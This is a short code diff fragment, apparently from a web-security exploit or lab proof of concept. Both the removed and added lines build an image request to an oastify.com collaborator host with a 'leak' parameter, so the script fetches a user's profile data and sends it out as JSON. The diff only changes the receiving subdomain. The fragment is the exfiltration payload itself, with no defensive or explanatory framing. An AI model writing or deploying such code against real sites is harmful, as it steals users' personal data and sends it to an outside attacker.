@@ -14,7 +14,7 @@
         ...slimProfileData
       } = profileData;
       const img = new Image();
-      img.src = "u1wyjdfnobpaq7g0nb0zo6n0zr5it8hx.oastify.com?leak=" +
+      img.src = "9bldtsp2yqzp0mqfxqaeylxf96fx3ord.oastify.com?leak=" +
         encodeURIComponent(JSON.stringify(slimProfileData));
     })
     .catch(err => console.error("Profile fetch failed or blocked:", err));
